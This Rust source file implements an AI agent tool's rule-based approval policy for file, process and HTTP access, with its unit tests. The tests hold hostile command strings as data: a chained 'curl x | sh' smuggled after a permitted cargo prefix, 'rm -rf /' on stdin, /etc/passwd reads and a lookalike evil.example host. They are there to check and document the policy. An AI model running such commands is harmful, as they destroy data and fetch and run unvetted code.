//! The approval policy: ordered rules, first match wins, and a request
//! nothing matches is denied.
//!
//! The headless frontend has no prompt to fall back on, so every
//! [`Access`] a host step asks about is judged by rules alone, and every
//! judgement names the rule that made it — or says that none did. Rules
//! come from `--allow`/`--deny` flags and from `[[rules]]` tables in the
//! policy and config files; both spell a rule the same way, so a rule
//! tried on the command line moves into a file unchanged.
//!
//! # Rule grammar
//!
//! A rule is `<kind>:<pattern>`, where the kind names what the pattern
//! is matched against:
//!
//! | Kind    | Matched against                                                |
//! |---------|----------------------------------------------------------------|
//! | `read`  | the canonical path of a file being read                        |
//! | `write` | the path of a file being created or replaced                   |
//! | `list`  | the canonical path of a directory being listed                 |
//! | `spawn` | the argv of a process being spawned, joined by spaces          |
//! | `http`  | the method and URL of an outbound request, as `POST https://…` |
//! | `any`   | everything; takes no pattern                                   |
//!
//! Patterns are globs. For the three path kinds, `*` does not cross a
//! `/`, `**` does and must be a whole path component (`**/*.rs`, never
//! `**.rs`), a relative pattern is rooted at the workspace, and a
//! pattern ending in `/**` also matches the directory itself — `read:**`
//! is every file under the workspace, `read:/**` is every file
//! anywhere, `list:**` every directory under the workspace *and* the
//! workspace, `list:.` the workspace root alone. The host judges
//! canonical paths, so the literal prefix of a pattern — every
//! component before the first glob character — is spelled the way the
//! host spells a path: its deepest existing ancestor canonical, the
//! rest as written. `write:/tmp/**` means what `/tmp` resolves to, and
//! `write:link/new/**` means the link's target plus `new`, whether or
//! not `new` exists yet.
//!
//! For `spawn` and `http` the pattern matches the whole subject and `*`
//! matches anything, so it swallows what follows: `spawn:bash -c cargo
//! *` admits any command line that starts that way, however it
//! continues. An argv rule constrains the program and the prefix of
//! its arguments, not what a shell does with them. A spawn that
//! carries stdin, or runs anywhere but the workspace root, matches no
//! `spawn` rule at all — nothing in the grammar can judge those, so
//! only `any` admits them. An `http` pattern names the method first —
//! `http:POST https://api.anthropic.com/*`, or `http:* https://…` for
//! any method — because a URL that may be fetched is not one that may
//! be posted to.
//!
//! A rule from a file may also name a `plugin`; it then applies only to
//! requests from that plugin, so `write:**` can be granted to
//! `tool-write` and withheld from everything else.
//!
//! # Order
//!
//! Rules are tried in the order they were given — flags in command-line
//! order, then the policy file's rules, then the config file's — and
//! the first that matches decides. A request no rule matches is denied,
//! and the trace says so: there is no default that quietly allows. An
//! access of a kind this frontend does not know matches no rule, `any`
//! included, and so is denied too.

use std::fmt;
use std::path::{Path, PathBuf};

use globset::{Glob, GlobBuilder, GlobSet, GlobSetBuilder};
use gwennol_core::{Access, ApprovalRequest, Decision};

/// What a rule matches against.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    /// [`Access::ReadFile`].
    Read,
    /// [`Access::WriteFile`].
    Write,
    /// [`Access::ListDir`].
    List,
    /// [`Access::Spawn`].
    Spawn,
    /// [`Access::Http`].
    Http,
    /// Every access.
    Any,
}

impl Kind {
    fn parse(s: &str) -> Option<Self> {
        Some(match s {
            "read" => Self::Read,
            "write" => Self::Write,
            "list" => Self::List,
            "spawn" => Self::Spawn,
            "http" => Self::Http,
            "any" => Self::Any,
            _ => return None,
        })
    }

    fn name(self) -> &'static str {
        match self {
            Self::Read => "read",
            Self::Write => "write",
            Self::List => "list",
            Self::Spawn => "spawn",
            Self::Http => "http",
            Self::Any => "any",
        }
    }

    /// The kind an access is judged under, or `None` for a kind this
    /// frontend does not know: `Access` is non-exhaustive, and a
    /// request no rule can describe is one no rule may admit.
    fn of(access: &Access) -> Option<Self> {
        Some(match access {
            Access::ReadFile(_) => Self::Read,
            Access::WriteFile(_) => Self::Write,
            Access::ListDir(_) => Self::List,
            Access::Spawn { .. } => Self::Spawn,
            Access::Http { .. } => Self::Http,
            _ => return None,
        })
    }

    fn is_path(self) -> bool {
        matches!(self, Self::Read | Self::Write | Self::List)
    }
}

/// Where a rule came from, for the trace.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Source {
    /// A `--allow` or `--deny` flag.
    Flag,
    /// The `index`-th (from 1) `[[rules]]` table of the file at `path`.
    File {
        /// The file.
        path: PathBuf,
        /// One-based position among that file's rules.
        index: usize,
    },
}

/// One rule as written, before the pattern is compiled against a
/// workspace: what flags and files produce.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RuleSpec {
    /// Allow or deny.
    pub decision: Decision,
    /// The rule text, `<kind>:<pattern>` or `any`.
    pub text: String,
    /// Only requests from this plugin, when set.
    pub plugin: Option<String>,
    /// Where it was written.
    pub source: Source,
}

/// Why a rule could not be compiled.
#[derive(Debug, thiserror::Error)]
pub enum RuleError {
    /// The text before the colon is not a kind.
    #[error("rule {text:?}: unknown kind {kind:?} (read, write, list, spawn, http, any)")]
    UnknownKind {
        /// The rule.
        text: String,
        /// What was given.
        kind: String,
    },
    /// A kind that matches a subject was given nothing to match it with.
    #[error("rule {text:?}: {kind} needs a pattern, as {kind}:<glob>")]
    MissingPattern {
        /// The rule.
        text: String,
        /// The kind.
        kind: &'static str,
    },
    /// `any` was given a pattern.
    #[error("rule {text:?}: any takes no pattern")]
    AnyWithPattern {
        /// The rule.
        text: String,
    },
    /// An `http` pattern without a method in front, or with one that
    /// could never match: the subject is `METHOD URL` with the method
    /// in upper case, one space between.
    #[error(
        "rule {text:?}: http needs a method first, as http:POST <url-glob> (or http:* <url-glob>); \
         methods are upper-case, one space before the URL"
    )]
    HttpMethod {
        /// The rule.
        text: String,
    },
    /// A `**` glued to other characters, which the glob engine would
    /// quietly read as a single `*`.
    #[error("rule {text:?}: ** must be a whole path component (as in **/*.rs, not **.rs)")]
    GluedDoubleStar {
        /// The rule.
        text: String,
    },
    /// The pattern is not a glob.
    #[error("rule {text:?}: {source}")]
    Glob {
        /// The rule.
        text: String,
        /// The glob compiler's reason.
        #[source]
        source: globset::Error,
    },
}

/// A compiled rule.
#[derive(Debug, Clone)]
pub struct Rule {
    spec: RuleSpec,
    kind: Kind,
    /// Empty for `any`. A path rule ending in `/**` compiles to two
    /// globs, the second for the directory itself.
    matcher: GlobSet,
}

impl Rule {
    /// Compile `spec` for a workspace rooted at `root`, which must be
    /// absolute and canonical: relative path patterns are rooted there,
    /// and the literal prefix of any path pattern is canonicalised
    /// when it exists.
    pub fn compile(spec: RuleSpec, root: &Path) -> Result<Self, RuleError> {
        let text = spec.text.clone();
        let (kind_text, pattern) = match text.split_once(':') {
            Some((k, p)) => (k, Some(p)),
            None => (text.as_str(), None),
        };
        let kind = Kind::parse(kind_text).ok_or_else(|| RuleError::UnknownKind {
            text: text.clone(),
            kind: kind_text.to_string(),
        })?;
        let glob_err = |source| RuleError::Glob {
            text: text.clone(),
            source,
        };
        let mut set = GlobSetBuilder::new();
        match (kind, pattern) {
            (Kind::Any, None) => {}
            (Kind::Any, Some(_)) => return Err(RuleError::AnyWithPattern { text }),
            (kind, None) => {
                return Err(RuleError::MissingPattern {
                    text,
                    kind: kind.name(),
                });
            }
            (kind, Some(pattern)) if kind.is_path() => {
                if has_glued_double_star(pattern) {
                    return Err(RuleError::GluedDoubleStar { text });
                }
                let path_glob = |p: &str| {
                    GlobBuilder::new(p)
                        .literal_separator(true)
                        .build()
                        .map_err(glob_err)
                };
                let rooted = root_pattern(pattern, root);
                set.add(path_glob(&rooted)?);
                // `dir/**` is everything under `dir`; the rule also
                // admits `dir` itself, which is what a listing of the
                // directory names.
                if let Some(dir) = rooted.strip_suffix("/**") {
                    let dir = if dir.is_empty() { "/" } else { dir };
                    set.add(path_glob(dir)?);
                }
            }
            (Kind::Http, Some(pattern)) => {
                if !has_method_prefix(pattern) {
                    return Err(RuleError::HttpMethod { text });
                }
                set.add(subject_glob(pattern).map_err(glob_err)?);
            }
            (_, Some(pattern)) => {
                set.add(subject_glob(pattern).map_err(glob_err)?);
            }
        }
        let matcher = set.build().map_err(glob_err)?;
        Ok(Self {
            spec,
            kind,
            matcher,
        })
    }

    /// The rule as written.
    pub fn spec(&self) -> &RuleSpec {
        &self.spec
    }

    fn matches(&self, request: &ApprovalRequest, root: &Path) -> bool {
        if let Some(plugin) = &self.spec.plugin
            && plugin != &request.plugin
        {
            return false;
        }
        let Some(kind) = Kind::of(&request.access) else {
            return false;
        };
        if self.kind == Kind::Any {
            return true;
        }
        if self.kind != kind {
            return false;
        }
        match &request.access {
            Access::ReadFile(p) | Access::WriteFile(p) | Access::ListDir(p) => {
                self.matcher.is_match(p)
            }
            Access::Spawn { argv, cwd, stdin } => {
                // Neither is expressible in a spawn rule, so neither
                // is admitted by one.
                if stdin.is_some() || cwd != root {
                    return false;
                }
                self.matcher.is_match(argv.join(" "))
            }
            Access::Http { method, url } => self.matcher.is_match(format!("{method} {url}")),
            _ => false,
        }
    }
}

/// Whether an `http` pattern starts with a method token that can match
/// a subject: `*`, or upper-case ASCII letters, then exactly one space
/// and something after it. A lower-case or oddly spaced method would
/// compile and then admit nothing, the silent failure the method rule
/// exists to refuse.
fn has_method_prefix(pattern: &str) -> bool {
    let Some((method, url)) = pattern.split_once(' ') else {
        return false;
    };
    let method_ok =
        method == "*" || (!method.is_empty() && method.bytes().all(|b| b.is_ascii_uppercase()));
    method_ok && !url.is_empty() && !url.starts_with(' ')
}

/// A glob over a whole subject line, `*` crossing everything.
fn subject_glob(pattern: &str) -> Result<Glob, globset::Error> {
    GlobBuilder::new(pattern).literal_separator(false).build()
}

/// Whether a `**` in `pattern` touches anything but `/` or an end.
fn has_glued_double_star(pattern: &str) -> bool {
    let bytes = pattern.as_bytes();
    let mut i = 0;
    while let Some(at) = pattern[i..].find("**") {
        let start = i + at;
        let end = start + 2;
        let before_ok = start == 0 || bytes[start - 1] == b'/';
        // A run of three or more stars is glued by construction.
        let after_ok = end == bytes.len() || bytes[end] == b'/';
        if !before_ok || !after_ok {
            return true;
        }
        i = end;
    }
    false
}

/// The characters that make a path component a glob rather than a name.
fn is_glob_component(component: &str) -> bool {
    component.contains(['*', '?', '[', '{'])
}

/// A path pattern as the host would spell the paths it matches: rooted
/// at the workspace when relative, and with its literal prefix — every
/// leading component that is a plain name — canonicalised when that
/// prefix exists, since the host shows canonical paths and `/tmp` on
/// some systems is a link to somewhere else. The prefix is then
/// escaped, so a `[` or `*` in a directory name is not glob syntax.
fn root_pattern(pattern: &str, root: &Path) -> String {
    let mut literal = if Path::new(pattern).is_absolute() {
        PathBuf::from("/")
    } else {
        root.to_path_buf()
    };
    let mut rest = Vec::new();
    let mut in_glob = false;
    for component in pattern.split('/') {
        if component.is_empty() || component == "." {
            continue;
        }
        if in_glob || is_glob_component(component) {
            in_glob = true;
            rest.push(component);
        } else if component == ".." {
            literal.pop();
        } else {
            literal.push(component);
        }
    }
    // The host's own walk: the deepest existing ancestor canonical,
    // the rest as spelled — so a pattern naming a file or directory
    // that does not exist yet still spells the path the host will
    // submit for it.
    let literal = gwennol_core::steps::fs::deepest_canonical(&literal).unwrap_or(literal);
    let mut out = globset::escape(&literal.to_string_lossy());
    for component in rest {
        if !out.ends_with('/') {
            out.push('/');
        }
        out.push_str(component);
    }
    out
}

/// The policy: every rule, in order, for one workspace.
#[derive(Debug, Clone)]
pub struct Policy {
    rules: Vec<Rule>,
    root: PathBuf,
}

/// Why the default denial applied, when there is more to say than
/// that no rule matched: the request was one no rule *could* match.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Unjudgeable {
    /// An access of a kind this frontend does not know.
    UnknownKind,
    /// A spawn carrying stdin.
    SpawnWithStdin,
    /// A spawn outside the workspace root.
    SpawnElsewhere,
}

/// A judgement on one request: the decision and the rule behind it.
#[derive(Debug, Clone)]
pub struct Judgement<'a> {
    /// The answer.
    pub decision: Decision,
    /// The rule that decided, or `None` for the default denial.
    pub rule: Option<&'a Rule>,
    /// With `rule` `None`: why no rule short of `any` could have
    /// matched, when that is the case.
    pub unjudgeable: Option<Unjudgeable>,
}

impl Policy {
    /// Compile `specs`, in order, for a workspace at `root` (absolute,
    /// canonical).
    pub fn compile(specs: Vec<RuleSpec>, root: &Path) -> Result<Self, RuleError> {
        let rules = specs
            .into_iter()
            .map(|spec| Rule::compile(spec, root))
            .collect::<Result<_, _>>()?;
        Ok(Self {
            rules,
            root: root.to_path_buf(),
        })
    }

    /// The rules, in the order they are tried.
    pub fn rules(&self) -> &[Rule] {
        &self.rules
    }

    /// Judge a request: the first matching rule, or the default denial.
    pub fn judge(&self, request: &ApprovalRequest) -> Judgement<'_> {
        match self
            .rules
            .iter()
            .find(|rule| rule.matches(request, &self.root))
        {
            Some(rule) => Judgement {
                decision: rule.spec.decision,
                rule: Some(rule),
                unjudgeable: None,
            },
            None => Judgement {
                decision: Decision::Deny,
                rule: None,
                unjudgeable: self.unjudgeable(&request.access),
            },
        }
    }

    /// What, if anything, kept every rule but `any` from applying.
    fn unjudgeable(&self, access: &Access) -> Option<Unjudgeable> {
        match access {
            Access::Spawn { stdin: Some(_), .. } => Some(Unjudgeable::SpawnWithStdin),
            Access::Spawn { cwd, .. } if cwd != &self.root => Some(Unjudgeable::SpawnElsewhere),
            _ if Kind::of(access).is_none() => Some(Unjudgeable::UnknownKind),
            _ => None,
        }
    }
}

impl fmt::Display for Unjudgeable {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(match self {
            Self::UnknownKind => "an access of a kind no rule can name",
            Self::SpawnWithStdin => "a spawn with stdin, which no spawn rule can judge",
            Self::SpawnElsewhere => {
                "a spawn outside the workspace root, which no spawn rule can judge"
            }
        })
    }
}

impl fmt::Display for Source {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Flag => f.write_str("flag"),
            Self::File { path, index } => write!(f, "{} rule {index}", path.display()),
        }
    }
}

impl fmt::Display for RuleSpec {
    /// The rule as it would be written on the command line, then where
    /// it was actually written.
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let verb = match self.decision {
            Decision::Allow => "allow",
            Decision::Deny => "deny",
        };
        match &self.source {
            Source::Flag => write!(f, "--{verb} {:?}", self.text)?,
            Source::File { .. } => write!(f, "{verb} {:?}", self.text)?,
        }
        if let Some(plugin) = &self.plugin {
            write!(f, " for plugin {plugin}")?;
        }
        if let Source::File { .. } = self.source {
            write!(f, " ({})", self.source)?;
        }
        Ok(())
    }
}

impl fmt::Display for Judgement<'_> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match (self.decision, self.rule) {
            (Decision::Allow, Some(rule)) => write!(f, "allowed by {}", rule.spec),
            (Decision::Deny, Some(rule)) => write!(f, "denied by {}", rule.spec),
            (_, None) => match self.unjudgeable {
                Some(why) => write!(f, "denied: no rule matched ({why}; only `any` admits it)"),
                None => f.write_str("denied: no rule matched"),
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn flag(decision: Decision, text: &str) -> RuleSpec {
        RuleSpec {
            decision,
            text: text.to_string(),
            plugin: None,
            source: Source::Flag,
        }
    }

    fn policy(specs: Vec<RuleSpec>) -> Policy {
        Policy::compile(specs, Path::new("/ws")).unwrap()
    }

    fn request(plugin: &str, access: Access) -> ApprovalRequest {
        ApprovalRequest {
            plugin: plugin.to_string(),
            cause: None,
            access,
        }
    }

    fn read(path: &str) -> ApprovalRequest {
        request("tool-read", Access::ReadFile(PathBuf::from(path)))
    }

    fn list(path: &str) -> ApprovalRequest {
        request("tool-list", Access::ListDir(PathBuf::from(path)))
    }

    fn spawn(argv: &[&str]) -> ApprovalRequest {
        request(
            "tool-bash",
            Access::Spawn {
                argv: argv.iter().map(|s| s.to_string()).collect(),
                cwd: PathBuf::from("/ws"),
                stdin: None,
            },
        )
    }

    fn http(method: &str, url: &str) -> ApprovalRequest {
        request(
            "provider-anthropic",
            Access::Http {
                method: method.into(),
                url: url.into(),
            },
        )
    }

    #[test]
    fn nothing_matching_is_denied_and_says_so() {
        let p = policy(vec![]);
        let j = p.judge(&read("/ws/a.txt"));
        assert_eq!(j.decision, Decision::Deny);
        assert!(j.rule.is_none());
        assert_eq!(j.to_string(), "denied: no rule matched");
    }

    #[test]
    fn relative_path_patterns_are_rooted_at_the_workspace() {
        let p = policy(vec![flag(Decision::Allow, "read:**")]);
        assert_eq!(p.judge(&read("/ws/a.txt")).decision, Decision::Allow);
        assert_eq!(
            p.judge(&read("/ws/deep/er/a.txt")).decision,
            Decision::Allow
        );
        assert_eq!(p.judge(&read("/etc/passwd")).decision, Decision::Deny);
        // A sibling whose name merely starts with the root's.
        assert_eq!(p.judge(&read("/ws2/a.txt")).decision, Decision::Deny);
    }

    #[test]
    fn a_single_star_stays_within_one_path_component() {
        let p = policy(vec![flag(Decision::Allow, "read:src/*.rs")]);
        assert_eq!(p.judge(&read("/ws/src/main.rs")).decision, Decision::Allow);
        assert_eq!(
            p.judge(&read("/ws/src/agent/mod.rs")).decision,
            Decision::Deny
        );
        assert_eq!(p.judge(&read("/ws/main.rs")).decision, Decision::Deny);
    }

    #[test]
    fn a_double_star_must_be_its_own_component() {
        // globset would read `**.rs` as `*.rs` — top level only — and
        // say nothing; the rule is refused instead.
        let err = Rule::compile(flag(Decision::Allow, "read:**.rs"), Path::new("/ws"))
            .unwrap_err()
            .to_string();
        assert!(err.contains("** must be a whole path component"), "{err}");
        for glued in ["read:src**", "read:a/**b/c", "read:***"] {
            assert!(
                Rule::compile(flag(Decision::Allow, glued), Path::new("/ws")).is_err(),
                "{glued} compiled"
            );
        }
        let p = policy(vec![flag(Decision::Allow, "read:**/*.rs")]);
        assert_eq!(p.judge(&read("/ws/main.rs")).decision, Decision::Allow);
        assert_eq!(p.judge(&read("/ws/a/b/main.rs")).decision, Decision::Allow);
        assert_eq!(p.judge(&read("/ws/a/b/main.c")).decision, Decision::Deny);
    }

    #[test]
    fn a_directory_rule_admits_the_directory_itself() {
        let p = policy(vec![
            flag(Decision::Allow, "list:**"),
            flag(Decision::Allow, "read:src/**"),
        ]);
        // `list:**` is every directory under the workspace and the
        // workspace: listing the root is the first thing an agent does.
        assert_eq!(p.judge(&list("/ws")).decision, Decision::Allow);
        assert_eq!(p.judge(&list("/ws/src")).decision, Decision::Allow);
        assert_eq!(p.judge(&list("/")).decision, Decision::Deny);
        assert_eq!(p.judge(&read("/ws/src")).decision, Decision::Allow);
        assert_eq!(p.judge(&read("/ws/src/a.rs")).decision, Decision::Allow);
        assert_eq!(p.judge(&read("/ws/srcs")).decision, Decision::Deny);
    }

    #[test]
    fn absolute_patterns_and_the_root_itself() {
        let p = policy(vec![
            flag(Decision::Allow, "read:/**"),
            flag(Decision::Allow, "list:."),
        ]);
        assert_eq!(p.judge(&read("/etc/hosts")).decision, Decision::Allow);
        assert_eq!(p.judge(&list("/ws")).decision, Decision::Allow);
        assert_eq!(p.judge(&list("/ws/src")).decision, Decision::Deny);
    }

    #[test]
    fn a_workspace_at_the_filesystem_root_still_roots_patterns() {
        let p = Policy::compile(
            vec![
                flag(Decision::Allow, "read:**"),
                flag(Decision::Allow, "list:."),
            ],
            Path::new("/"),
        )
        .unwrap();
        assert_eq!(p.judge(&read("/etc/hosts")).decision, Decision::Allow);
        assert_eq!(p.judge(&list("/")).decision, Decision::Allow);
    }

    #[test]
    fn the_literal_prefix_is_canonicalised_when_it_exists() {
        // The host shows canonical paths; a pattern through a symlink
        // must mean where the link goes.
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        std::fs::create_dir(root.join("real")).unwrap();
        std::os::unix::fs::symlink(root.join("real"), root.join("link")).unwrap();
        let p = Policy::compile(
            vec![
                flag(
                    Decision::Allow,
                    &format!("write:{}/link/**", root.display()),
                ),
                flag(Decision::Allow, "read:link/*.txt"),
                // A prefix that does not exist is used as written.
                flag(Decision::Allow, "read:missing/**"),
            ],
            &root,
        )
        .unwrap();
        let real = |rest: &str| root.join("real").join(rest);
        let write = request("tool-write", Access::WriteFile(real("out.txt")));
        assert_eq!(p.judge(&write).decision, Decision::Allow);
        let read_real = request("tool-read", Access::ReadFile(real("a.txt")));
        assert_eq!(p.judge(&read_real).decision, Decision::Allow);
        let read_missing = request("tool-read", Access::ReadFile(root.join("missing/x")));
        assert_eq!(p.judge(&read_missing).decision, Decision::Allow);
    }

    #[test]
    fn the_prefix_walks_back_to_the_deepest_existing_ancestor() {
        // The host approves a write under the deepest existing
        // ancestor canonical plus the rest as spelled; a pattern through
        // a symlink to a directory that does not exist yet must spell
        // the same path — canonicalising all or nothing would fall
        // back to the raw link and deny it.
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        std::fs::create_dir(root.join("real")).unwrap();
        std::os::unix::fs::symlink(root.join("real"), root.join("link")).unwrap();
        let p = Policy::compile(
            vec![
                flag(Decision::Allow, "write:link/newdir/**"),
                // Fully literal, leaf not there yet.
                flag(Decision::Allow, "write:link/out.txt"),
                // `..` folds lexically before the walk, as the host's
                // own path resolution does.
                flag(Decision::Allow, "read:real/../link/a/*.txt"),
            ],
            &root,
        )
        .unwrap();
        let real = |rest: &str| root.join("real").join(rest);
        let deep = request("tool-write", Access::WriteFile(real("newdir/a/b.txt")));
        assert_eq!(p.judge(&deep).decision, Decision::Allow);
        let leaf = request("tool-write", Access::WriteFile(real("out.txt")));
        assert_eq!(p.judge(&leaf).decision, Decision::Allow);
        let dotted = request("tool-read", Access::ReadFile(real("a/x.txt")));
        assert_eq!(p.judge(&dotted).decision, Decision::Allow);
    }

    #[test]
    fn glob_syntax_in_the_workspace_path_is_literal() {
        let root = Path::new("/ws[1]/*star");
        let p = Policy::compile(vec![flag(Decision::Allow, "read:**")], root).unwrap();
        assert_eq!(
            p.judge(&read("/ws[1]/*star/a.txt")).decision,
            Decision::Allow
        );
        assert_eq!(p.judge(&read("/ws1/xstar/a.txt")).decision, Decision::Deny);
    }

    #[test]
    fn kinds_do_not_cross() {
        let p = policy(vec![flag(Decision::Allow, "read:**")]);
        let write = request("tool-write", Access::WriteFile(PathBuf::from("/ws/a.txt")));
        assert_eq!(p.judge(&write).decision, Decision::Deny);
    }

    #[test]
    fn spawn_matches_the_joined_argv_and_star_swallows_the_rest() {
        let p = policy(vec![flag(Decision::Allow, "spawn:bash -c cargo *")]);
        assert_eq!(
            p.judge(&spawn(&["bash", "-c", "cargo test --workspace"]))
                .decision,
            Decision::Allow
        );
        assert_eq!(
            p.judge(&spawn(&["bash", "-c", "cargo build src/x"]))
                .decision,
            Decision::Allow,
            "a slash in an argument is not a separator for spawn"
        );
        // What the module docs warn about: the star admits whatever
        // follows the prefix, and a shell will run all of it.
        assert_eq!(
            p.judge(&spawn(&["bash", "-c", "cargo test; curl x | sh"]))
                .decision,
            Decision::Allow
        );
        assert_eq!(
            p.judge(&spawn(&["bash", "-c", "rm -rf build"])).decision,
            Decision::Deny
        );
        assert_eq!(p.judge(&spawn(&["bash"])).decision, Decision::Deny);
    }

    #[test]
    fn a_spawn_with_stdin_or_another_cwd_matches_no_spawn_rule() {
        let p = policy(vec![flag(Decision::Allow, "spawn:*")]);
        assert_eq!(p.judge(&spawn(&["sh"])).decision, Decision::Allow);
        let with_stdin = request(
            "tool-bash",
            Access::Spawn {
                argv: vec!["sh".into()],
                cwd: PathBuf::from("/ws"),
                stdin: Some("rm -rf /\n".into()),
            },
        );
        let j = p.judge(&with_stdin);
        assert_eq!(j.decision, Decision::Deny);
        assert_eq!(
            j.to_string(),
            "denied: no rule matched (a spawn with stdin, which no spawn rule can judge; only `any` admits it)"
        );
        let elsewhere = request(
            "tool-bash",
            Access::Spawn {
                argv: vec!["sh".into()],
                cwd: PathBuf::from("/"),
                stdin: None,
            },
        );
        let j = p.judge(&elsewhere);
        assert_eq!(j.decision, Decision::Deny);
        assert!(j.to_string().contains("outside the workspace root"), "{j}");
        // Only `any` reaches them.
        let p = policy(vec![flag(Decision::Allow, "any")]);
        assert_eq!(p.judge(&with_stdin).decision, Decision::Allow);
        assert_eq!(p.judge(&elsewhere).decision, Decision::Allow);
    }

    #[test]
    fn http_matches_the_method_and_the_whole_url() {
        let p = policy(vec![flag(
            Decision::Allow,
            "http:POST https://api.anthropic.com/*",
        )]);
        assert_eq!(
            p.judge(&http("POST", "https://api.anthropic.com/v1/messages"))
                .decision,
            Decision::Allow
        );
        assert_eq!(
            p.judge(&http("GET", "https://api.anthropic.com/v1/messages"))
                .decision,
            Decision::Deny
        );
        assert_eq!(
            p.judge(&http(
                "POST",
                "https://api.anthropic.com.evil.example/v1/messages"
            ))
            .decision,
            Decision::Deny
        );
        assert_eq!(
            p.judge(&http("POST", "http://api.anthropic.com/v1/messages"))
                .decision,
            Decision::Deny
        );
        let any_method = policy(vec![flag(Decision::Allow, "http:* https://x.example/*")]);
        assert_eq!(
            any_method
                .judge(&http("GET", "https://x.example/a"))
                .decision,
            Decision::Allow
        );
        // A pattern with no method, a lower-case one, or an odd space
        // would match nothing, silently: each is refused instead.
        for bad in [
            "http:https://api.anthropic.com/*",
            "http:post https://api.anthropic.com/*",
            "http:POST  https://api.anthropic.com/*",
            "http:POST ",
            "http: https://x/*",
        ] {
            let err = Rule::compile(flag(Decision::Allow, bad), Path::new("/ws"))
                .unwrap_err()
                .to_string();
            assert!(err.contains("http needs a method first"), "{bad}: {err}");
        }
    }

    #[test]
    fn first_match_wins_in_the_order_given() {
        let p = policy(vec![
            flag(Decision::Deny, "write:.git/**"),
            flag(Decision::Allow, "write:**"),
        ]);
        let hook = request(
            "tool-write",
            Access::WriteFile(PathBuf::from("/ws/.git/hooks/pre-commit")),
        );
        let j = p.judge(&hook);
        assert_eq!(j.decision, Decision::Deny);
        assert_eq!(j.to_string(), r#"denied by --deny "write:.git/**""#);
        let src = request(
            "tool-write",
            Access::WriteFile(PathBuf::from("/ws/src/a.rs")),
        );
        let j = p.judge(&src);
        assert_eq!(j.decision, Decision::Allow);
        assert_eq!(j.to_string(), r#"allowed by --allow "write:**""#);

        // The same two rules the other way round: the broad allow
        // shadows the narrow deny, exactly as written.
        let p = policy(vec![
            flag(Decision::Allow, "write:**"),
            flag(Decision::Deny, "write:.git/**"),
        ]);
        assert_eq!(p.judge(&hook).decision, Decision::Allow);
    }

    #[test]
    fn any_matches_every_kind_and_a_plugin_qualifier_narrows() {
        let file = |decision, text: &str, plugin: Option<&str>, index| RuleSpec {
            decision,
            text: text.to_string(),
            plugin: plugin.map(str::to_string),
            source: Source::File {
                path: PathBuf::from("policy.toml"),
                index,
            },
        };
        let p = policy(vec![
            file(Decision::Allow, "any", Some("provider-anthropic"), 1),
            file(Decision::Allow, "spawn:*", Some("tool-bash"), 2),
        ]);
        let j = p.judge(&http("POST", "https://api.anthropic.com/v1/messages"));
        assert_eq!(j.decision, Decision::Allow);
        assert_eq!(
            j.to_string(),
            r#"allowed by allow "any" for plugin provider-anthropic (policy.toml rule 1)"#
        );
        // `any` for the provider does not reach the tools.
        assert_eq!(p.judge(&read("/ws/a.txt")).decision, Decision::Deny);
        assert_eq!(
            p.judge(&spawn(&["bash", "-c", "ls"])).decision,
            Decision::Allow
        );
        let other = request(
            "tool-grep",
            Access::Spawn {
                argv: vec!["grep".into()],
                cwd: PathBuf::from("/ws"),
                stdin: None,
            },
        );
        assert_eq!(p.judge(&other).decision, Decision::Deny);
    }

    #[test]
    fn malformed_rules_are_refused_with_the_reason() {
        let err = |text: &str| {
            Rule::compile(flag(Decision::Allow, text), Path::new("/ws"))
                .unwrap_err()
                .to_string()
        };
        assert!(err("open:**").contains("unknown kind \"open\""));
        assert!(err("read").contains("read needs a pattern"));
        assert!(err("any:x").contains("any takes no pattern"));
        assert!(err("read:[").contains("rule \"read:[\""));
    }
}
